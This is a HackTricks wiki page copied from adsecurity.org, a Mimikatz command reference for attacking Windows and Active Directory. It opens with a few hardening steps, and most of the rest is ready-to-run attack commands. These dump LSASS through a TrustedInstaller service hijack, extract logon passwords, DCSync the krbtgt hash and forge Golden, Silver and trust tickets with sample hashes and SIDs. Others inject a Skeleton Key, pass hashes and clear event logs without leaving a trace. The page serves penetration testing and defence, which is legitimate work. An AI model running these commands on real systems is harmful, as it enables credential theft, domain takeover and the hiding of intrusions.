# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

The content of this page was copied [adsecurity.org](https://adsecurity.org/?page\_id=1821)

## LM and Clear-Text in memory

Starting with Windows 8.1 and Windows Server 2012 R2, the LM hash and “clear-text” password are no longer in memory.

In order to prevent the “clear-text” password from being placed in LSASS, the following registry key needs to be set to “0” (Digest Disabled):

_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)_

## **Mimikatz & LSA Protection:**

Windows Server 2012 R2 and Windows 8.1 includes a new feature called LSA Protection which involves enabling [LSASS as a protected process on Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz can bypass with a driver, but that should make some noise in the event logs):

_The LSA, which includes the Local Security Authority Server Service (LSASS) process, validates users for local and remote sign-ins and enforces local security policies. The Windows 8.1 operating system provides additional protection for the LSA to prevent reading memory and code injection by non-protected processes. This provides added security for the credentials that the LSA stores and manages._

Enabling LSA protection:

1. Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa and Set the value of the registry key to: “RunAsPPL”=dword:00000001.
2. Create a new GPO and browse to Computer Configuration, Preferences, Windows Settings. Right-click Registry, point to New, and then click Registry Item. The New Registry Properties dialog box appears. In the Hive list, click HKEY\_LOCAL\_MACHINE. In the Key Path list, browse to SYSTEM\CurrentControlSet\Control\Lsa. In the Value name box, type RunAsPPL. In the Value type box, click the REG\_DWORD. In the Value data box, type 00000001.Click OK.

LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (“!+”).

[![Mimikatz-Driver-Remove-LSASS-Protection](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg)

### Bypassing Disabled SeDebugPrivilege
By default, SeDebugPrivilege is granted to the Administrators group through the Local Security Policy. In an Active Directory environment, [it is possible to remove this privilege](https://medium.com/blue-team/preventing-mimikatz-attacks-ed283e7ebdd5) by setting Computer Configuration --> Policies --> Windows Settings --> Security Settings --> Local Policies --> User Rights Assignment --> Debug programs defined as an empty group. Even in offline AD-connected devices, this setting cannot be overwritten and Local Administrators will receive an error when attempting to dump memory or use Mimikatz. 

However, the TrustedInstaller account will still have access to dump memory and [can be used to bypass this defense](https://www.pepperclipp.com/other-articles/dump-lsass-when-debug-privilege-is-disabled). By modifying the config for the TrustedInstaller service, the account can be run to use ProcDump and dump the memory for `lsass.exe`. 

```
sc config TrustedInstaller binPath= "C:\Users\Public\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp"
sc start TrustedInstaller
```

[![TrustedInstaller-Dump-Lsass](https://1860093151-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M6yZUYP7DLMbZuztKpV%2Fuploads%2FJtprjloNPADNSpb6S0DS%2Fimage.png?alt=media&token=9b639459-bd4c-4897-90af-8990125fa058)

This dump file can be exfiltrated to an attacker-controlled computer where the credentials can be extracted. 

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Main

### **EVENT**

**EVENT::Clear** – Clear an event log\
[\
![Mimikatz-Event-Clear](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png)

**EVENT:::Drop** – (_**experimental**_) Patch Events service to avoid new events

[![Mimikatz-Event-Drop](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png)

Note:\
Run privilege::debug then event::drop to patch the event log. Then run Event::Clear to clear the event log without any log cleared event (1102) being logged.

### KERBEROS

#### Golden Ticket

A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and sign.

A Golden Ticket (GT) can be created to impersonate any user (real or imagined) in the domain as a member of any group in the domain (providing a virtually unlimited amount of rights) to any and every resource in the domain.

**Mimikatz Golden Ticket Command Reference:**

The Mimikatz command to create a golden ticket is “kerberos::golden”

* /domain – the fully qualified domain name. In this example: “lab.adsecurity.org”.
* /sid – the SID of the domain. In this example: “S-1-5-21-1473643419-774954089-2222329127”.
* /sids – Additional SIDs for accounts/groups in the AD forest with rights you want the ticket to spoof. Typically, this will be the Enterprise Admins group for the root domain “S-1-5-21-1473643419-774954089-5872329127-519”. T[his parameter adds the provided SIDs to the SID History parameter.](https://adsecurity.org/?p=1640)
* /user – username to impersonate
* /groups (optional) – group RIDs the user is a member of (the first is the primary group).\
  Add user or computer account RIDs to receive the same access.\
  Default Groups: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
* /krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
* /ticket (optional) – provide a path and name for saving the Golden Ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.
* /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use.
* /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID).
* /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
* /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years (\~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
* /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz Default value is 10 years (\~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes).
* /sids (optional) – set to be the SID of the Enterprise Admins group in the AD forest (\[ADRootDomainSID]-519) to spoof Enterprise Admin rights throughout the AD forest (AD admin in every domain in the AD Forest).
* /aes128 – the AES128 key
* /aes256 – the AES256 key

Golden Ticket Default Groups:

* Domain Users SID: S-1-5-21\<DOMAINID>-513
* Domain Admins SID: S-1-5-21\<DOMAINID>-512
* Schema Admins SID: S-1-5-21\<DOMAINID>-518
* Enterprise Admins SID: S-1-5-21\<DOMAINID>-519 (this is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights)
* Group Policy Creator Owners SID: S-1-5-21\<DOMAINID>-520

```
.\mimikatz "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```

[Golden tickets across domains](https://adsecurity.org/?p=1640)

#### Silver Ticket

A Silver Ticket is a TGS (similar to TGT in format) using the target service account’s (identified by SPN mapping) NTLM password hash to encrypt and sign.

**Example Mimikatz Command to Create a Silver Ticket:**

The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (_Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit_). The NTLM password hash is used with the /rc4 paramteer. The service SPN type also needs to be identified in the /service parameter. Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.

```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
```

#### [**Trust Ticket**](https://adsecurity.org/?p=1588)

Once the Active Directory Trust password hash is determined, a trust ticket can be generated. The trust tickets are created using the shared password between 2 Domains that trust each other.\
[More background on Trust Tickets.](https://adsecurity.org/?p=1588)

**Dumping trust passwords (trust keys)**

```
Mimikatz “privilege::debug” “lsadump::trust /patch” exit
```

**Create a forged trust ticket (inter-realm TGT) using Mimikatz**

Forge the trust ticket which states the ticket holder is an Enterprise Admin in the AD Forest (leveraging SIDHistory, “sids”, across trusts in Mimikatz, my “contribution” to Mimikatz). This enables full administrative access from a child domain to the parent domain. Note that this account doesn’t have to exist anywhere as it is effectively a Golden Ticket across the trust.

```
Mimikatz “Kerberos::golden /domain:child.lab.adsecurity.org /sid:S-1-5-21-3677078698-724690114-1972670770 /sids:S-1-5-21-1581655573-3923512380-696647894-519 /rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi” exit
```

Trust Ticket Specific Required Parameters:

* \*\*/\*\*target – the target domain’s FQDN.
* \*\*/\*\*service – the kerberos service running in the target domain (krbtgt).
* \*\*/\*\*rc4 – the NTLM hash for the service kerberos service account (krbtgt).
* \*\*/\*\*ticket – provide a path and name for saving the forged ticket file to for later use or use /ptt to immediately inject the golden ticket into memory for use.

#### **More KERBEROS**

**KERBEROS::List** – List all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.\
Similar to functionality of “klist”.

**KERBEROS::PTC** – pass the cache (NT6)\
\*Nix systems like Mac OS, Linux,BSD, Unix, etc cache Kerberos credentials. This cached data can be copied off and passed using Mimikatz. Also useful for injecting Kerberos tickets in ccache files.

A good example of Mimikatz’s kerberos::ptc is when [exploiting MS14-068 with PyKEK](https://adsecurity.org/?p=676). PyKEK generates a ccache file which can be injected with Mimikatz using kerberos::ptc.

[![Mimikatz-PTC-PyKEK-ccacheFile](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg)

**KERBEROS::PTT** – pass the ticket\
After a [Kerberos ticket is found](https://adsecurity.org/?p=1667), it can be copied to another system and passed into the current session effectively simulating a logon without any communication with the Domain Controller. No special rights required.\
Similar to SEKURLSA::PTH (Pass-The-Hash).

* /filename – the ticket’s filename (can be multiple)
* /diretory – a directory path, all .kirbi files inside will be injected.

[![KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)](https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png)

**KERBEROS::Purge** – purge all Kerberos tickets\
Similar to functionality of “klist purge”. Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used.

[![Mimikatz-Kerberos-Purge](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png)

**KERBEROS::TGT** – get current TGT for current user.

[![Mimikatz-Kerberos-TGT](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png)

### LSADUMP

**LSADUMP**::**DCShadow** – Set the current machines as DC to have the habitability to create new objects inside the DC (persistent method).\
This requires full AD admin rights or KRBTGT pw hash.\
DCShadow temporarily sets the computer to be a “DC” for the purposes of replication:

* Creates 2 objects in the AD forest Configuration partition.
* Updates the SPN of the computer used to include “GC” (Global Catalog) and “E3514235-4B06-11D1-AB04-00C04FC2DCD2” (AD Replication). More info on Kerberos Service Principal Names in the [ADSecurity SPN section](https://adsecurity.org/?page\_id=183).
* Pushes the updates to DCs via DrsReplicaAdd and KCC.
* Removes the created objects from the Configuration partition.

**LSADUMP::DCSync** – ask a DC to synchronize an object (get password data for account)\
[Requires membership in Domain Administrator, domain Administrators, or custom delegation.](https://adsecurity.org/?p=1729)

A major feature added to Mimkatz in August 2015 is “DCSync” which effectively “impersonates” a Domain Controller and requests account password data from the targeted Domain Controller.

**DCSync Options:**

* /all – DCSync pull data for the entire domain.
* /user – user id or SID of the user you want to pull the data for.
* /domain (optional) – FQDN of the Active Directory domain. Mimikatz will discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.
* /csv – export to csv
* /dc (optional) – Specify the Domain Controller you want DCSync to connect to and gather data.

There’s also a /guid parameter.

**DCSync Command Examples:**

Pull password data for the KRBTGT user account in the rd.adsecurity.org domain:\
_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt” exit_

Pull password data for the Administrator user account in the rd.adsecurity.org domain:\
_Mimikatz “lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator” exit_

Pull password data for the ADSDC03 Domain Controller computer account in the lab.adsecurity.org domain:\
_Mimikatz “lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$” exit_

**LSADUMP::LSA** – Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use /patch for a subset of data, use /inject for everything. _Requires System or Debug rights._

* /inject – Inject LSASS to extract credentials
* /name – account name for target user account
* /id – RID for target user account
* /patch – patch LSASS.

Often service accounts are members of Domain Admins (or equivalent) or a Domain Admin was recently logged on to the computer an attacker dump credentials from. Using these credentials, an attacker can gain access to a Domain Controller and get all domain credentials, including the KRBTGT account NTLM hash which is used to create Kerberos Golden Tickets.

```
mimikatz lsadump::lsa /inject exit
```

**LSADUMP::NetSync**

NetSync provides a simple way to use a DC computer account password data to impersonate a Domain Controller via a Silver Ticket and DCSync the target account’s information including the password data\_.\_

**LSADUMP::SAM** – get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts.

**LSADUMP::Secrets** – get the SysKey to decrypt SECRETS entries (from registry or hives).

**LSADUMP::SetNTLM** – Ask a server to set a new password/ntlm for one user.

[**LSADUMP::Trust**](https://adsecurity.org/?p=1588) – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).

### MISC

[**MISC::Skeleton**](https://adsecurity.org/?p=1275) – Inject Skeleton Key into LSASS process on Domain Controller.

```
"privilege::debug" "misc::skeleton"
```

### PRIVILEGE

**PRIVILEGE::Backup** – get backup privilege/rights. Requires Debug rights.

**PRIVILEGE::Debug** – get debug rights (this or Local System rights is required for many Mimikatz commands).

### SEKURLSA

**SEKURLSA::Credman** – List Credentials Manager

**SEKURLSA::Ekeys** – List **Kerberos encryption keys**

**SEKURLSA::Kerberos** – List Kerberos credentials for all authenticated users (including services and computer account)

**SEKURLSA::Krbtgt** – get Domain Kerberos service account (KRBTGT)password data

**SEKURLSA::SSP** – Lists SSP credentials

**SEKURLSA::Wdigest** – List WDigest credentials

**SEKURLSA::LogonPasswords** – lists all available provider credentials. This usually shows recently logged on user and computer credentials.

* Dumps password data in LSASS for currently logged on (or recently logged on) accounts as well as services running under the context of user credentials.
* Account passwords are stored in memory in a reversible manner. If they are in memory (prior to Windows 8.1/Windows Server 2012 R2 they were), they are displayed. Windows 8.1/Windows Server 2012 R2 doesn’t store the account password in this manner in most cases. KB2871997 “back-ports” this security capability to Windows 7, Windows 8, Windows Server 2008R2, and Windows Server 2012, though the computer needs additional configuration after applying KB2871997.
* Requires administrator access (with debug rights) or Local SYSTEM rights

**SEKURLSA::Minidump** – switch to LSASS minidump process context (read lsass dump)

**SEKURLSA::Pth** – Pass-the-Hash and Over-Pass-the-Hash (aka pass the key).

_Mimikatz can perform the well-known operation ‘Pass-The-Hash’ to run a process under another credentials with NTLM hash of the user’s password, instead of its real password. For this, it starts a process with a fake identity, then replaces fake information (NTLM hash of the fake password) with real information (NTLM hash of the real password)._

* /user – the username you want to impersonate, keep in mind that Administrator is not the only name for this well-known account.
* /domain – the fully qualified domain name – without domain or in case of local user/admin, use computer or server name, workgroup or whatever.
* /rc4 or /ntlm – optional – the RC4 key / NTLM hash of the user’s password.
* /run – optional – the command line to run – default is: cmd to have a shell.

[![Mimikatz-Sekurlsa-PTH](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg)

**SEKURLSA::Tickets** – Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account.\
Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).

* /export – optional – tickets are exported in .kirbi files. They start with user’s LUID and group number (0 = TGS, 1 = client ticket(?) and 2 = TGT)

Similar to credential dumping from LSASS, using the sekurlsa module, an attacker can get all Kerberos ticket data in memory on a system, including those belonging to an admin or service.\
This is extremely useful if an attacker has compromised a web server configured for Kerberos delegation that users access with a backend SQL server. This enables an attacker to capture and reuse all user tickets in memory on that server.

The “kerberos::tickets” mimikatz command dumps the current logged-on user’s Kerberos tickets and does not require elevated rights. Leveraging the sekurlsa module’s capability to read from protected memory (LSASS), all Kerberos tickets on the system can be dumped.

Command: _mimikatz sekurlsa::tickets exit_

* Dumps all authenticated Kerberos tickets on a system.
* Requires administrator access (with debug) or Local SYSTEM rights

### **SID**

The Mimikatz SID module replaces MISC::AddSID. Use SID::Patch to patch the ntds service.

**SID::add** – Add a SID to SIDHistory of an object

[![Mimikatz-SID-add](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png)

**SID::modify** – Modify object SID of an object

[![Mimikatz-SID-Modify](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png)

### **TOKEN**

The Mimikatz Token module enables Mimikatz to interact with Windows authentication tokens, including grabbing and impersonating existing tokens.

**TOKEN::Elevate** – impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box using the Windows API.\
_Requires Administrator rights._

[![Mimikatz-Token-Elevate1](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png)

Find a domain admin credential on the box and use that token: _token::elevate /domainadmin_

[![Mimikatz-Token-Elevate-DomainAdmin](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg)

**TOKEN::List** – list all tokens of the system

### **TS**

**TS::MultiRDP** – (experimental) Patch Terminal Server service to allow multiple users

[![Mimikatz-TS-MultiRDP](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png)

**TS::Sessions** – List TS/RDP sessions.

![](https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png)

### Vault

`mimikatz.exe "privilege::debug" "token::elevate" "vault::cred /patch" "exit"` - Get passwords of scheduled tasks

\
\
\\

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
